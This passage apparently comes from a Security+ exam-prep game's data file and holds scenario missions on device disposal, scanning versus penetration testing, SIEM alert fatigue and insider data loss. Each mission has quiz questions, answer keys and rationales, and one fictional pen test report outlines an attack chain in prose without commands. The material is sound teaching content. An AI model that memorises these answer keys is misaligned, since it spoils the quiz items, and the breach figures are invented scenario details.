      'Deploy static application security testing (SAST) to find code vulnerabilities',
      'Enforce stronger password complexity requirements',
      'Increase the frequency of penetration testing from annual to quarterly'
    ],
    correctIndex: 0,
    rationales: [
      'CORRECT: Full-disk encryption (FDE) encrypts all data on the drive using a key tied to the device\'s TPM and user credentials. When the device is lost or stolen, the data is unreadable without the decryption key. Even though the laptop wasn\'t returned, FDE would have rendered the 47GB of recovered data useless to forensic analysis. This is the primary control for protecting data on lost/stolen endpoints.',
      'INCORRECT: SAST finds vulnerabilities in source code during development. While important for application security, it has zero effect on protecting data on a lost physical device. Even if the code had no vulnerabilities, the data would still be recoverable from the unencrypted drive.',
      'INCORRECT: Password complexity helps prevent unauthorized account access but doesn\'t protect data at rest on a physical device. Forensic tools bypass user authentication entirely by reading data directly from the drive.',
      'INCORRECT: Penetration testing identifies security weaknesses in running systems and networks. It doesn\'t prevent data recovery from a physical device that\'s already outside your control. The laptop was offline and sold on eBay — pen testing is irrelevant here.'
    ]
  },

  debrief: `This incident demonstrates CompTIA Objectives 4.1 (Asset Management) and 4.2 (Application Security). Asset management requires a full lifecycle: procurement → assignment → tracking → enumeration → decommissioning → sanitization → certificate of destruction.

Key concepts learned:
  - ASSET MANAGEMENT: Track all devices from acquisition to disposal, integrate with HR offboarding
  - MEDIA SANITIZATION: Clearing (insecure), purging (secure overwrite), destruction (most secure)
  - CERTIFICATE OF DESTRUCTION: Legal proof of compliant data destruction
  - DATA RETENTION: Keep data only as long as legally required, then mandatory sanitization
  - FULL-DISK ENCRYPTION: Protects data on lost/stolen devices
  - SECURE CODING: Input validation, prepared statements, output encoding, secure cookies
  - SAST: Static code analysis to find vulnerabilities before deployment
  - DYNAMIC ANALYSIS / FUZZING: Test running applications with malformed inputs
  - CODE SIGNING: Digital signatures prove code authenticity
  - SANDBOXING: Isolate untrusted code execution

Without encryption, physical device loss equals total data compromise.`,

  escalation: `The recovered customer database contained 42,000 records including EU residents, triggering GDPR mandatory breach notification. Because the breach was discovered 8 months after the device left company control, the 72-hour notification window was missed — a serious compliance violation. The company must now notify all affected customers, provide credit monitoring services, and report the incident to regulators. PCI DSS violations result in forensic audit costs of $180,000 and monthly fines from card brands totaling $35,000 until compliance is restored. Legal estimates total cost at $2.4M including notification, remediation, fines, and reputational damage. The source code leak gives attackers a roadmap to exploit the production application — three attempted SQL injection attacks are detected within a week of the eBay listing going live.`,

  refs: [
    { source: 'Study Guide', section: '4.1 - Asset Management', page: 64 },
    { source: 'Study Guide', section: '4.9 - Media Sanitization', page: 84 },
    { source: 'Study Guide', section: '1.4 - Application Security', page: 12 },
    { source: 'Study Guide', section: '5.5 - Data Retention', page: 92 }
  ]
},

// ============================================================
// DOMAIN 4 — Security Operations (Obj 4.3)
// Teaches: Vulnerability Scanning, Threat Intelligence, Penetration Testing
// ============================================================
{
  id: 'MISSION-026',
  title: 'The False Sense of Security',
  domain: 'Security Operations',
  objectiveCodes: ['4.3'],
  threatLevel: 'critical',
  tags: ['Vulnerability Scanning', 'Penetration Testing', 'Threat Intelligence', 'CVSS', 'False Negatives'],
  briefing: 'CRISIS ALERT: Your company\'s annual penetration test just concluded — and the results are devastating. The external pen testing team achieved full domain compromise in under 4 hours and exfiltrated 200GB of sensitive data through a series of exploits. The shocking part: your monthly vulnerability scans showed "zero critical vulnerabilities" for the past 6 months. The CISO is furious. How did the vulnerability scanner completely miss the flaws that pen testers exploited so easily? Your investigation must determine what failed, explain the difference between scanning and testing, and establish a threat intelligence program to prevent recurrence.',

  intel: [
    {
      id: 'vuln-01',
      type: 'report',
      label: 'Penetration Test Report — Executive Summary',
      content: `PENETRATION TEST FINDINGS — CRITICAL

Engagement type: Black box external penetration test
Scope: Public-facing web applications and network infrastructure
Rules of engagement: No social engineering, 8AM-6PM testing window, emergency contact provided
Duration: 40 hours over 5 days

ATTACK CHAIN — Full compromise achieved:

RECONNAISSANCE (2 hours):
  • Port scanning revealed web application on ports 80, 443
  • Service enumeration found custom Node.js application
  • OSINT (Open Source Intelligence) via LinkedIn identified technology stack
  • GitHub search found public repository with similar code structure

INITIAL ACCESS (1.5 hours):
  • Discovered API endpoint: /api/admin/users (no authentication required)
  • Exploited directory traversal vulnerability to read /etc/passwd
  • Used credentials from exposed .env file in error message

LATERAL MOVEMENT (30 minutes):
  • Pivoted to internal network via compromised web server
  • Used Responder tool to capture NTLM hashes from network traffic
  • Cracked weak password hashes offline

PERSISTENCE (20 minutes):
  • Created rogue Domain Administrator account
  • Established reverse shell backdoor for continued access

DATA EXFILTRATION (test only — no real data removed):
  • Accessed file server with domain admin credentials
  • Identified 200GB of customer PII, financial records, intellectual property
  • Demonstrated ability to exfiltrate via encrypted HTTPS tunnel (would evade DLP)

TOTAL TIME: 4 hours 20 minutes from zero access to domain admin

All exploited vulnerabilities were MISSED by the monthly vulnerability scanner.`,
      critical: true
    },
    {
      id: 'vuln-02',
      type: 'forensic',
      label: 'Vulnerability Scanner Analysis',
      content: `ROOT CAUSE ANALYSIS — Why the scanner missed critical vulnerabilities

VULNERABILITY SCANNING vs PENETRATION TESTING:

VULNERABILITY SCANNING (what you were doing):
  • Automated tool that checks for KNOWN vulnerabilities
  • Compares software versions against CVE databases
  • Port scanning to identify running services
  • Non-intrusive (doesn't attempt exploitation)
  • Fast, can scan hundreds of hosts
  • Types: Port scan, SAST (static code analysis), dynamic analysis, package monitoring
  • Produces list of potential vulnerabilities
  • HIGH FALSE POSITIVE and FALSE NEGATIVE rates

PENETRATION TESTING (what the pen testers did):
  • Manual testing by skilled security professionals
  • Attempts to actually EXPLOIT vulnerabilities
  • Chains multiple weaknesses together (attack paths)
  • Includes custom/zero-day vulnerabilities (not in CVE databases)
  • Slow, expensive, focused on specific targets
  • Simulates real-world attacker behavior
  • Proves what's actually exploitable vs. theoretically vulnerable

Why your scanner missed the issues:

1. CUSTOM APPLICATION CODE:
   • Vulnerability scanners rely on signature databases (CVE, NVD)
   • Your Node.js app had custom-written code with logic flaws
   • No CVE exists for YOUR specific code mistakes
   • Scanner can't detect custom business logic vulnerabilities

2. FALSE NEGATIVES (missed vulnerabilities):
   • Scanner didn't test the /api/admin/users endpoint (not in its test cases)
   • Directory traversal wasn't detected because scanner didn't try traversal payloads on that specific endpoint
   • Exposed .env file only appeared in error conditions (scanner didn't trigger the error)

3. SCANNER CONFIGURATION:
   • Set to "safe mode" to avoid disrupting production (no exploitation attempts)
   • Didn't include authenticated scanning (couldn't see internal app functionality)
   • Missing plugins for Node.js-specific vulnerabilities

The scanner gave you a false sense of security: "Zero critical vulnerabilities" meant "zero KNOWN vulnerabilities the scanner can detect" — not "actually secure."`,
      critical: true
    },
    {
      id: 'vuln-03',
      type: 'alert',
      label: 'CVSS Scoring and Exposure Factor',
      content: `VULNERABILITY SEVERITY ANALYSIS

CVSS (Common Vulnerability Scoring System) — v3.1

The directory traversal vulnerability the pen testers exploited:
  Base Score: 9.3 / 10 (CRITICAL)

Breakdown:
  • Attack Vector (AV): Network — Exploitable remotely
  • Attack Complexity (AC): Low — No special conditions needed
  • Privileges Required (PR): None — Unauthenticated
  • User Interaction (UI): None — No user action needed
  • Scope (S): Changed — Impacts resources beyond vulnerable component
  • Confidentiality Impact (C): High — Full disclosure of data
  • Integrity Impact (I): High — Modify any files
  • Availability Impact (A): High — Denial of service possible

CVSS SCORE RANGES:
  • 0.0 — None
  • 0.1 - 3.9 — Low
  • 4.0 - 6.9 — Medium
  • 7.0 - 8.9 — High
  • 9.0 - 10.0 — Critical

This was a CRITICAL vulnerability that your scanner rated as non-existent (false negative).

EXPOSURE FACTOR:
  • Percentage of asset value lost if vulnerability is exploited
  • Directory traversal on web server: 80% exposure (can read most files, exfiltrate data)
  • Full domain compromise: 100% exposure (total control of all assets)

CVE (Common Vulnerabilities and Exposures):
  • Unique identifier for publicly disclosed vulnerabilities (e.g., CVE-2024-12345)
  • Maintained by MITRE, searchable in National Vulnerability Database (NVD)
  • Your custom code vulnerabilities don't get CVEs (they're specific to your application)

EXPLOIT DATABASES:
  • Public repositories of exploit code (Exploit-DB, Metasploit)
  • Threat actors use these to weaponize known vulnerabilities
  • Pen testers use them to validate exploitability`,
      critical: false
    },
    {
      id: 'vuln-04',
      type: 'intercepted',
      label: 'Threat Intelligence Brief',
      content: `THREAT INTELLIGENCE — Building a Program

What is threat intelligence? Information about current and emerging threats (TTPs, indicators of compromise, vulnerability trends, threat actor profiles) used to make informed security decisions.

TYPES OF THREAT INTELLIGENCE:

1. OSINT (Open Source Intelligence):
   • Publicly available information: news, research papers, blogs, Twitter, forums
   • Examples: CVE announcements, security advisories, breach disclosures
   • FREE, but requires curation and analysis

2. PROPRIETARY / COMMERCIAL:
   • Paid feeds from vendors (CrowdStrike, Mandiant, Recorded Future)
   • Vetted, contextualized, high-confidence indicators
   • Threat actor profiles, campaign analysis, predictive intelligence

3. DARK WEB MONITORING:
   • Monitoring criminal forums, marketplaces, paste sites
   • Early warning of credential leaks, planned attacks, exploit sales
   • Requires specialized access and expertise

4. INFORMATION SHARING ORGANIZATIONS:
   • ISACs (Information Sharing and Analysis Centers) for specific industries
   • FS-ISAC (Financial Services), H-ISAC (Healthcare), etc.
   • CTAs (Cyber Threat Alliances) — Collaborative sharing between vendors
   • STIX/TAXII protocols for automated threat data exchange

THREAT INTELLIGENCE APPLIED TO YOUR INCIDENT:

OSINT sources that would have helped:
  • GitHub monitoring for leaked credentials (the .env file was similar to public repos)
  • Node.js security advisories (known issues in your dependency versions)
  • OWASP Top 10 (directory traversal is #1: Broken Access Control)

Proprietary intelligence:
  • Threat actor TTPs (the techniques used in your pen test match real-world attack patterns)
  • Exploit trends (directory traversal exploits increased 40% in the past year)

Dark web monitoring:
  • Employee credentials from previous breaches being sold (found 14 company email addresses in breach databases — credential stuffing risk)

Information sharing:
  • Your industry ISAC reported similar attacks on 3 other companies last month — you weren't subscribed

LESSON: Threat intelligence feeds inform what to scan for, what to prioritize, and where attackers are focusing. Your vulnerability management program lacked this context.`,
      critical: false
    },
    {
      id: 'vuln-05',
      type: 'log',
      label: 'Penetration Testing Process',
      content: `PENETRATION TESTING METHODOLOGY

The pen test followed a structured process you should understand:

PHASE 1 — RULES OF ENGAGEMENT:
  • Scope definition (what's in/out of scope)
  • Testing windows (when testing can occur)
  • Communication plan (who to contact if critical issue found)
  • Legal authorization (protect testers from prosecution)
  • Emergency stop conditions

PHASE 2 — RECONNAISSANCE:
  • Passive recon: OSINT, DNS enumeration, WHOIS lookups
  • Active recon: Port scanning, service enumeration
  • Goal: Map attack surface

PHASE 3 — INITIAL ACCESS:
  • Vulnerability identification and exploitation
  • Web app attacks, network attacks, social engineering (if in scope)

PHASE 4 — LATERAL MOVEMENT / PIVOTING:
  • Move from initial foothold to other systems
  • Privilege escalation
  • Pivoting: Using compromised system as jump point to reach others

PHASE 5 — PERSISTENCE:
  • Establish continued access mechanisms
  • Backdoors, rogue accounts, scheduled tasks

PHASE 6 — DATA EXFILTRATION (demonstration only):
  • Identify and access sensitive data
  • Prove ability to steal it (without actually removing real data)

PHASE 7 — REPORTING:
  • Document findings with evidence
  • Risk ratings, remediation recommendations

BUG BOUNTY PROGRAMS:
  • Alternative to traditional pen testing
  • Invite security researchers to find vulnerabilities
  • Pay rewards based on severity
  • Continuous testing (not annual point-in-time)
  • Platforms: HackerOne, Bugcrowd, Synack

Your company does annual pen tests but no bug bounty program — vulnerabilities discovered between tests go undetected for up to 12 months.`,
      critical: false
    }
  ],

  challenge: {
    question: 'Based on this incident, what is the PRIMARY reason the vulnerability scanner failed to detect the critical flaws exploited by pen testers?',
    options: [
      'The scanner was configured with incorrect IP address ranges',
      'The scanner detected only known CVEs, not custom application logic vulnerabilities',
      'The scanner was using outdated vulnerability signatures from 2 years ago',
      'The scanner was running on insufficient hardware resources'
    ],
    correctIndex: 1,
    rationales: [
      'INCORRECT: The investigation showed the scanner was properly configured to scan the web application. IP address configuration errors would prevent scanning entirely, not cause false negatives on specific vulnerabilities.',
      'CORRECT: Vulnerability scanners rely on databases of KNOWN vulnerabilities (CVEs). The exploited flaws were custom code mistakes specific to this application — directory traversal in a custom API endpoint, exposed .env file in error handling. No CVE exists for application-specific logic flaws. Only manual penetration testing or code review (SAST) can find these.',
      'INCORRECT: While outdated signatures are a problem, the investigation showed the scanner had current CVE databases. The issue wasn\'t that signatures were old — it\'s that NO signatures exist for custom code vulnerabilities.',
      'INCORRECT: Hardware resources would cause slow scans or incomplete results, not systematic false negatives on custom application vulnerabilities. The scanner completed successfully — it just couldn\'t detect logic flaws it wasn\'t designed to find.'
    ]
  },

  debrief: `This incident demonstrates CompTIA Objective 4.3: Vulnerability Management and Threat Intelligence. Vulnerability scanning and penetration testing serve different purposes — scanners find KNOWN vulnerabilities, pen testers find ACTUAL exploitable paths.

Key concepts learned:
  - VULNERABILITY SCANNING: Automated, fast, checks for known CVEs, high false positive/negative rates
  - PENETRATION TESTING: Manual, slow, exploits vulnerabilities, simulates real attacks
  - FALSE NEGATIVE: Scanner misses real vulnerability (what happened here — very dangerous)
  - FALSE POSITIVE: Scanner reports vulnerability that doesn't exist (wastes time)
  - CVSS: Scoring system for vulnerability severity (9.0-10.0 = Critical)
  - CVE: Unique ID for publicly disclosed vulnerabilities
  - EXPOSURE FACTOR: % of asset value lost if vulnerability exploited
  - THREAT INTELLIGENCE: OSINT, proprietary, dark web, information sharing (ISACs/CTAs)
  - PEN TEST PROCESS: Rules of engagement → reconnaissance → lateral movement → pivoting → persistence
  - BUG BOUNTY: Continuous vulnerability discovery by security researchers

Scanners provide breadth (scan everything). Pen tests provide depth (actually exploit). You need both.`,

  escalation: `The penetration test revealed that attackers could achieve domain compromise in under 5 hours — faster than the security team could detect and respond. Threat intelligence analysis shows 3 similar attacks occurred in your industry last month using the same TTPs (directory traversal → lateral movement → domain admin). Your company was vulnerable but unaware because you weren't subscribed to the industry ISAC. Two weeks after the pen test report is delivered, a real threat actor exploits the same directory traversal vulnerability (it wasn't patched yet). They exfiltrate 200GB of customer data and deploy ransomware. The attack mirrors the pen test exactly. Recovery costs total $3.8M. Post-incident review determines the breach was preventable: the pen testers told you exactly how to defend against it, but remediation was too slow.`,

  refs: [
    { source: 'Study Guide', section: '4.3 - Vulnerability Scanning', page: 69 },
    { source: 'Study Guide', section: '4.3 - CVSS and CVE', page: 71 },
    { source: 'Study Guide', section: '4.7 - Threat Intelligence', page: 79 },
    { source: 'Study Guide', section: '4.7 - Penetration Testing', page: 81 }
  ]
},

// ============================================================
// DOMAIN 4 — Security Operations (Obj 4.4)
// Teaches: SIEM, Log Aggregation, Security Monitoring, Alerting
// ============================================================
{
  id: 'MISSION-027',
  title: 'The Six-Month Breach',
  domain: 'Security Operations',
  objectiveCodes: ['4.4'],
  threatLevel: 'critical',
  tags: ['SIEM', 'Security Monitoring', 'Log Aggregation', 'Alert Tuning', 'SOC'],
  briefing: 'BREACH DISCLOSURE REQUIRED: A customer reported suspicious transactions on their account — then eleven more customers called with the same complaint. Your fraud team traced the pattern back to a compromised database server. Forensic analysis revealed the attacker had persistent access for SIX MONTHS, exfiltrating customer data weekly. The devastating discovery: your SIEM generated 47 alerts during the breach period flagging the suspicious activity. Every single alert was ignored or dismissed as a false positive by the overwhelmed SOC team. The board demands answers: how did a monitored, alerted breach go undetected for half a year?',

  intel: [
    {
      id: 'siem-01',
      type: 'alert',
      label: 'SIEM Alert Analysis — Retrospective',
      content: `SIEM ALERT REVIEW — 6-Month Breach Window

What is a SIEM? Security Information and Event Management system. Collects logs from across the infrastructure (systems, applications, network devices), correlates events to detect security incidents, generates alerts, provides dashboards and reporting.

SIEM CORE FUNCTIONS:
  1. LOG AGGREGATION — Collect logs from all sources in central repository
  2. CORRELATION — Identify patterns across multiple events (e.g., failed login + privilege escalation + data access = potential breach)
  3. ALERTING — Notify SOC team when thresholds or correlation rules trigger
  4. REPORTING — Generate compliance reports, incident summaries, trend analysis
  5. ARCHIVING — Long-term storage for forensics and compliance (1-7 years typical)
  6. DASHBOARDS — Real-time visualization of security metrics

ALERTS GENERATED during the breach (all IGNORED):
  • 19 alerts: "Database access from unusual IP address" (attacker's command & control server)
  • 12 alerts: "Large data transfer outside business hours" (2AM-4AM exfiltration)
  • 8 alerts: "Unusual SQL query patterns" (attacker dumping tables)
  • 5 alerts: "Failed authentication followed by successful login" (credential compromise)
  • 3 alerts: "New privileged account created" (attacker persistence)

TOTAL: 47 CRITICAL ALERTS over 6 months
ACTION TAKEN: 0

Why alerts were ignored:
  • SOC team received 1,200-1,800 alerts per DAY (98% false positives)
  • Alert fatigue: Analysts became desensitized, assumed everything was noise
  • No alert prioritization: Critical alerts mixed with low-severity informational events
  • Understaffed SOC: 2 analysts covering 24/7 (impossible workload)
  • No playbooks: When analyst saw "unusual IP," no documented steps to investigate

This is SIEM FAILURE MODE #1: Collecting data and generating alerts without proper tuning creates noise, not security.`,
      critical: true
    },
    {
      id: 'siem-02',
      type: 'log',
      label: 'Log Aggregation Architecture Review',
      content: `LOG COLLECTION ANALYSIS

WHAT WAS BEING MONITORED (sources feeding SIEM):
  ✓ Windows Active Directory (authentication logs)
  ✓ Firewalls (network traffic allow/deny)
  ✓ Web servers (HTTP access logs)
  ✓ Email gateway (spam/malware blocks)
  ✓ Endpoint antivirus (malware detections)

WHAT WAS NOT BEING MONITORED (blind spots):
  ✗ Database servers (no query logging enabled — couldn't see attacker's SQL commands)
  ✗ Linux application servers (logs not forwarded to SIEM)
  ✗ Cloud infrastructure (AWS CloudTrail not integrated)
  ✗ Network switches/routers (NetFlow data not collected)
  ✗ VPN concentrator (no visibility into remote access)

The compromised database server was sending logs to the SIEM, but DATABASE QUERY LOGGING was disabled (performance reasons). The SIEM only saw connection events (IP address connected), not what the attacker DID (which tables they accessed, what data they queried).

SECURITY MONITORING SCOPE (Obj 4.4):
  • SYSTEMS — Servers, workstations, databases (authentication, file access, configuration changes)
  • APPLICATIONS — Web apps, SaaS platforms (login attempts, data access, API calls)
  • INFRASTRUCTURE — Network devices, cloud platforms (traffic flows, configuration changes, admin actions)

AGENTS vs AGENTLESS MONITORING:
  • AGENT-BASED: Software installed on monitored system (endpoint EDR, log forwarder)
    - Pros: Detailed visibility, works if network isolated, can respond locally
    - Cons: Performance impact, deployment complexity, requires maintenance
  • AGENTLESS: Remote monitoring via protocols (SNMP, WMI, NetFlow, API)
    - Pros: No software to deploy, minimal performance impact
    - Cons: Limited visibility, requires network connectivity, can't respond

Your database servers were monitored via agentless SNMP (system health metrics only) — no query-level visibility.`,
      critical: true
    },
    {
      id: 'siem-03',
      type: 'forensic',
      label: 'Alert Correlation Failure Analysis',
      content: `CORRELATION RULE ANALYSIS

SIEM correlation identifies attack patterns by connecting related events across multiple log sources. Example:

INDIVIDUAL EVENTS (alone, not suspicious):
  1. Failed login attempt from IP 203.0.113.45 (could be typo)
  2. Successful login from same IP 30 seconds later (user corrected password)
  3. Privilege escalation command executed (admin might be doing maintenance)
  4. Database access at 2AM (could be automated backup job)
  5. Large file transfer to external IP (could be legitimate cloud backup)

CORRELATED PATTERN (highly suspicious):
  Events 1-5 happening in sequence within 10-minute window = CREDENTIAL COMPROMISE + PRIVILEGE ESCALATION + DATA EXFILTRATION

Your SIEM had correlation rules but they were misconfigured:

RULE: "Alert if 5+ failed logins from same IP in 1 minute"
ATTACKER BEHAVIOR: 1 failed login, wait 2 minutes, try again (slow brute force)
RESULT: Rule never triggered (threshold too high, time window too narrow)

RULE: "Alert if data transfer > 10GB in 1 hour"
ATTACKER BEHAVIOR: Transfer 2GB every night for 6 months (120GB total)
RESULT: Rule never triggered (individual transfers under threshold)

PROPER TUNING:
  • Baseline normal behavior first (ML-based anomaly detection)
  • Set thresholds based on actual environment patterns, not guesses
  • Use multiple correlation factors (time, user, source IP, data volume, command patterns)
  • Regularly review and adjust rules based on false positive/negative rates

SCAP (Security Content Automation Protocol):
  • Standardized method for expressing security rules and checking configurations
  • XCCDF (checklists), OVAL (vulnerability definitions), CVE (vulnerability names)
  • Enables automated compliance checking (CIS Benchmarks via SCAP)

Your SIEM supported SCAP but no compliance checks were configured.`,
      critical: false
    },
    {
      id: 'siem-04',
      type: 'report',
      label: 'SOC Operations Review',
      content: `SECURITY OPERATIONS CENTER (SOC) ASSESSMENT

CURRENT STATE:
  • Team size: 2 full-time analysts (should be minimum 6 for 24/7 coverage)
  • Alert volume: 1,200-1,800 per day
  • Time per alert investigation: 2 minutes average (rushed, incomplete)
  • Escalation process: None documented
  • Playbooks/runbooks: None
  • SIEM training: 1 analyst had 2-day course 3 years ago

SOC MATURITY MODEL:
  Level 1 (your current state): Reactive, overwhelmed, alert-driven
  Level 2: Proactive monitoring, documented playbooks, basic metrics
  Level 3: Threat hunting, advanced correlation, automated response
  Level 4: Threat intelligence integration, predictive analytics
  Level 5: Fully automated detection and response (SOAR integration)

DASHBOARDS — What the SOC should be watching:
  • Real-time alert queue (prioritized by severity)
  • Top talkers (hosts generating most traffic/alerts)
  • Geographic anomalies (connections from unexpected countries)
  • Authentication failures by user/system
  • Data exfiltration indicators (outbound volume spikes)
  • Compliance status (patch levels, configuration drift)

Your SIEM has 47 pre-built dashboards. Only 1 is actively used (the main alert queue). Analysts never look at geographic anomalies — which would have immediately flagged the attacker's connections from a known threat actor country.

ALERT TUNING PROCESS (missing):
  1. Monitor alert for 30 days
  2. Classify true positives vs false positives
  3. If >80% false positive rate, adjust threshold or disable
  4. If valuable signal, refine to reduce noise
  5. Document business justification for each alert rule
  6. Quarterly review of all active alerts

Instead, your SOC kept every default alert rule enabled (vendor shipped 200+ rules) and never tuned a single one.`,
      critical: false
    },
    {
      id: 'siem-05',
      type: 'witness',
      label: 'SOC Analyst Interview',
      content: `Interview with Night Shift SOC Analyst:

"On a typical night shift, I get about 600 alerts. I've learned that 99% of them are false positives — someone accessing a file share after hours, a server rebooting, automated scans from IT. After you see the same false alerts for months, you stop investigating. You just click 'dismiss' and move on."

"The 'unusual IP address' alerts happen constantly because our SIEM doesn't know about our cloud infrastructure — AWS instances have dynamic IPs that change, and every time one changes, it triggers an 'unusual IP' alert. I probably dismissed 200 of those alerts over the past 6 months without investigation. The attacker's IP was mixed in there somewhere."

"We don't have playbooks. When I see an alert, I have to decide on my own whether it's worth investigating. There's no guidance, no escalation criteria. If I escalated every 'unusual' thing to my manager, I'd be escalating 100 times per shift. So I use my judgment, which usually means dismiss and move on."

"The SIEM dashboard shows real-time alerts but there's no prioritization. A critical database breach alert looks the same as a low-severity informational event. They're both just lines in the queue."

Interview with SIEM Administrator:

"We installed this SIEM 4 years ago. Initial setup was done by a contractor who's long gone. We turned on all the default correlation rules and alert templates. No one has reviewed or tuned them since deployment. I don't think anyone really understands how half the rules work."

"Log retention is set to 90 days. After that, logs are deleted to save storage costs. For this breach investigation, we only have the last 3 months of logs — the first 3 months of the breach are gone forever."

LESSON: A SIEM is only as good as its tuning, staffing, and processes. Technology alone doesn't create security.`,
      critical: false
    }
  ],

  challenge: {
    question: 'What was the ROOT CAUSE that allowed the breach to go undetected despite SIEM alerts being generated?',
    options: [
      'The SIEM software had a critical bug that prevented alerts from displaying',
      'The attacker used advanced evasion techniques that bypassed all SIEM detection rules',
      'Alert fatigue from poor tuning caused analysts to dismiss critical alerts as false positives',
      'The SIEM was not configured to monitor database servers'
    ],
    correctIndex: 2,
    rationales: [
      'INCORRECT: The investigation confirmed the SIEM was functioning correctly and displaying alerts. The software worked as designed — 47 alerts were generated and visible to analysts.',
      'INCORRECT: The attacker used basic techniques (credential compromise, SQL queries, data transfers). The SIEM detected all of it and generated appropriate alerts. The attacker didn\'t need evasion — the alerts were simply ignored.',
      'CORRECT: The root cause was alert fatigue driven by poor tuning. With 1,200-1,800 alerts per day and 98% false positive rate, analysts became desensitized and dismissed everything without investigation. The SIEM correctly identified the breach 47 times, but untuned noise buried the signal. This is the most common SIEM failure mode in real-world breaches.',
      'INCORRECT: The database server WAS monitored and sending logs to the SIEM. Database query logging wasn\'t enabled (which limited forensic detail), but connection-level events were collected — enough to generate the 47 alerts about unusual IP addresses and data transfers. The problem wasn\'t lack of monitoring, it was lack of response.'
    ]
  },

  debrief: `This incident demonstrates CompTIA Objective 4.4: Security Monitoring and SIEM. A SIEM collects logs, correlates events, and generates alerts — but without proper tuning, staffing, and processes, it creates noise instead of security.

Key concepts learned:
  - SIEM FUNCTIONS: Log aggregation, correlation, alerting, reporting, archiving, dashboards
  - SECURITY MONITORING SCOPE: Systems, applications, infrastructure (all must be monitored)
  - ALERT FATIGUE: Too many false positives → analysts dismiss everything → real threats ignored
  - CORRELATION: Connecting related events across multiple log sources to identify attack patterns
  - AGENTS vs AGENTLESS: Installed software vs remote monitoring (trade-offs in visibility and performance)
  - SOC MATURITY: Reactive → proactive → threat hunting → automated response
  - SCAP: Security Content Automation Protocol for standardized compliance checking
  - CIS BENCHMARKS: Industry-standard secure configuration guides (enforceable via SCAP)
  - TUNING PROCESS: Monitor, classify true/false positives, adjust thresholds, quarterly review

A SIEM without tuning is an alert generator, not a security tool. Signal-to-noise ratio is everything.`,

  escalation: `The six-month breach exposed 127,000 customer records including payment card data, SSNs, and personally identifiable information. Mandatory breach notification costs total $890,000 (letters, call center, credit monitoring). PCI DSS forensic investigation and fines add $450,000. Three class-action lawsuits are filed. The breach makes national news because the SIEM alerts were documented and ignored — evidence of negligence. Cyber insurance denies the claim citing "failure to maintain reasonable security controls." Total cost: $8.4M in direct expenses, immeasurable reputational damage. The CISO and CIO are both terminated. The board mandates emergency SOC transformation: hire 6 additional analysts, implement alert tuning program, deploy SOAR (Security Orchestration, Automation, and Response) to automate triage, and engage MDR (Managed Detection and Response) service until internal capabilities mature. Annual security budget increases by $2.1M.`,

  refs: [
    { source: 'Study Guide', section: '4.4 - SIEM Systems', page: 73 },
    { source: 'Study Guide', section: '4.4 - Security Monitoring', page: 72 },
    { source: 'Study Guide', section: '4.8 - SCAP and Benchmarks', page: 82 }
  ]
},

// ============================================================
// DOMAIN 4 — Security Operations (Obj 4.4)
// Teaches: DLP, Security Monitoring Tools, NetFlow, SNMP
// ============================================================
{
  id: 'MISSION-028',
  title: 'The Silent Exfiltration',
  domain: 'Security Operations',
  objectiveCodes: ['4.4'],
  threatLevel: 'high',
  tags: ['DLP', 'Data Loss Prevention', 'NetFlow', 'SNMP', 'Exfiltration', 'Monitoring Tools'],
  briefing: 'INSIDER THREAT DETECTED: A departing employee, Sarah Chen, was uploading gigabytes of proprietary product designs to her personal Dropbox account over the past 3 weeks — her last weeks before leaving for a competitor. The theft was only discovered when a colleague noticed her desktop screen showed unfamiliar cloud storage during a video call. Forensic investigation confirmed she exfiltrated 340GB of intellectual property. Your security architecture had NO Data Loss Prevention solution deployed. Network monitoring tools existed but weren\'t configured to detect data exfiltration. The CEO wants to know: what security tools should have caught this, and why didn\'t we have them?',

  intel: [
    {
      id: 'dlp-01',
      type: 'forensic',
      label: 'Forensic Timeline — Data Exfiltration',
      content: `DIGITAL FORENSICS REPORT — Exfiltration Activity

Employee: Sarah Chen, Senior Product Designer
Tenure: 6 years (departing for direct competitor)
Notice provided: 3 weeks (standard)

EXFILTRATION TIMELINE:
  Day 1 (notice given):
    - Installed Dropbox desktop client on work laptop
    - Configured personal Dropbox account (not company-managed)
  
  Days 2-18:
    - Systematic upload of entire product design repository (340GB)
    - 847 CAD files (mechanical designs)
    - 1,240 PDF specifications
    - 340 MB of customer contracts and pricing data
    - Source code for embedded firmware (127 MB)
  
  Upload pattern:
    - Transfers occurred during business hours (blended with normal work activity)
    - Average 20GB per day
    - Encrypted HTTPS traffic to dropbox.com (unreadable to network monitoring)
    - No alerts generated by any security system

What SHOULD have detected this — DATA LOSS PREVENTION (DLP):

DLP monitors data in three states:
  1. DATA AT REST — Files stored on servers, workstations, databases
  2. DATA IN MOTION — Network traffic, email, web uploads, file transfers
  3. DATA IN USE — Files being accessed, copied, modified, printed

DLP DEPLOYMENT TYPES:
  • ENDPOINT DLP — Agent on workstation monitors file operations, clipboard, USB, screen capture, print
  • NETWORK DLP — Inline appliance inspects traffic leaving the network perimeter
  • CLOUD DLP — API integration with SaaS platforms (monitors Office 365, Google Drive, etc.)
  • EMAIL DLP — Gateway scans outbound email and attachments

A properly configured DLP solution would have:
  1. Detected CAD files (sensitive data type) being uploaded to unauthorized cloud storage
  2. Blocked or quarantined the transfers in real-time
  3. Alerted security team to suspicious bulk exfiltration pattern
  4. Required manager approval for large data transfers outside corporate systems`,
      critical: true
    },
    {
      id: 'dlp-02',
      type: 'report',
      label: 'DLP Architecture and Policies',
      content: `DATA LOSS PREVENTION — Implementation Guide

DLP POLICY FRAMEWORK:

1. DATA CLASSIFICATION (what to protect):
   • PUBLIC — No protection needed
   • INTERNAL — Company confidential (require DLP monitoring)
   • SENSITIVE — Customer data, financials, IP (require DLP blocking)
   • RESTRICTED — Trade secrets, regulated data (strict controls, encryption, no external sharing)

2. DETECTION METHODS:
   • CONTENT INSPECTION — Pattern matching (SSN format: XXX-XX-XXXX, credit card numbers)
   • DOCUMENT FINGERPRINTING — Identify sensitive files by unique hash (even if renamed)
   • CONTEXTUAL ANALYSIS — File type + size + destination + user behavior
   • MACHINE LEARNING — Anomaly detection (user uploads 100x normal volume)

3. RESPONSE ACTIONS:
   • MONITOR — Log event, no blocking (learning mode)
   • ALERT — Notify security team, allow transfer to proceed
   • PROMPT USER — Ask for business justification before allowing
   • BLOCK — Prevent transfer, notify user and security
   • QUARANTINE — Move file to secure review area, require approval
   • ENCRYPT — Force encryption before allowing transfer

IMPLEMENTATION BEST PRACTICES:
  • Start with MONITOR mode for 30-90 days (establish baseline, tune policies)
  • Begin with high-value data: IP, customer data, financial records, source code
  • Integrate with data classification system (automated tagging)
  • Exception process for legitimate business needs
